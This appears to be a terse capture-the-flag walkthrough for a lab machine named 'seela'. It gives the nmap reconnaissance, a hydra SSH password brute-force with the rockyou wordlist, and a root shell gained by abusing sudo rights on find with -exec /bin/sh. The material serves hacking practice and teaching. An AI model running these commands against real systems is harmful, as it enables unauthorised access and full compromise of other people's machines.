#seela #Seela_saison1

# recon
└─# nmap -Pn -sV -T4 -p 22 -sC 10.42.7.11
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 09:18 EDT
Nmap scan report for 10.42.7.11 (10.42.7.11)
Host is up (0.067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```

# exploit
└─# hydra 10.42.7.11 -s 22 ssh -l seela -P /usr/share/wordlists/rockyou.txt
```
[22][ssh] host: 10.42.7.11   login: seela   password: rockyou
```

# foothold with ssh
$ sudo -l
```
(root) /usr/bin/find *
```
~$ sudo find . -exec /bin/sh \; -quit
```
#
```

